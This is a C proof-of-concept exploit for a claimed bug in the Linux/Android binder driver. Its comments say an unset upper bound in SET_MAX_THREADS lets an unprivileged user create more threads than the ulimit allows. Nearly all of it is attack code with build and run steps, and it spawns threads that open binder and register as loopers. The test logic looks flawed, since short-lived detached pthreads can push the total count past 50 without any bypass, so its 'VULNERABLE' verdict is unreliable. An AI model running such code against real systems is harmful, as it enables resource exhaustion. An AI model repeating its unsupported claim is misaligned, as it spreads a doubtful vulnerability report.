/*
 * beyond_ulimit.c - Bypass RLIMIT_NPROC via binder SET_MAX_THREADS bug
 *
 * Demonstrates that an unprivileged user (uid=65534, nobody) with
 * ulimit -u 50 can create 200+ threads by exploiting the missing
 * upper bound check in binder's set_max_threads().
 *
 * Affected: CONFIG_ANDROID_BINDER_IPC (C) and CONFIG_ANDROID_BINDER_IPC_RUST
 *
 * The bug: process.rs line 1142-1144:
 *   fn set_max_threads(&self, max: u32) {
 *       self.inner.lock().max_threads = max;  // no bounds check
 *   }
 *
 * Build: gcc -static -pthread -o beyond_ulimit beyond_ulimit.c
 * Run:   ulimit -u 50; ./beyond_ulimit
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_MAP_SIZE         (128 * 1024)
#define BC_REGISTER_LOOPER      0x630b

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

static int open_binder(void)
{
    int fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    return fd;
}

/*
 * Each thread opens its own binder fd → new binder_proc in kernel.
 * Registers as looper → kernel allocates binder_thread.
 * These kernel allocations are NOT counted against RLIMIT_NPROC.
 */
static void *binder_thread(void *arg)
{
    int fd = open_binder();
    if (fd < 0) return NULL;

    mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);

    uint32_t max = 0xFFFFFFFF;
    ioctl(fd, BINDER_SET_MAX_THREADS, &max);

    uint32_t cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(fd, BINDER_WRITE_READ, &bwr);

    close(fd);
    return NULL;
}

int main(void)
{
    printf("=== Beyond ulimit: Binder SET_MAX_THREADS Exploit ===\n");
    printf("pid=%d uid=%d\n\n", getpid(), getuid());

    int created = 0, failed = 0;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 16384);

    for (int i = 0; i < 300; i++) {
        pthread_t t;
        if (pthread_create(&t, &attr, binder_thread, NULL) != 0) {
            failed++;
            if (failed == 1)
                printf("[!] First thread creation failure at #%d: %s\n",
                       i, strerror(errno));
            continue;
        }
        pthread_detach(t);
        created++;
    }
    pthread_attr_destroy(&attr);

    /* Wait for threads to finish */
    usleep(500000);

    printf("\nResult:\n");
    printf("  Threads created: %d\n", created);
    printf("  Threads failed:  %d\n", failed);
    printf("\n");

    if (created > 50)
        printf("VULNERABLE: ulimit bypassed! Created %d threads (limit should be 50)\n", created);
    else
        printf("Limited: only %d threads created (ulimit enforced)\n", created);

    return 0;
}
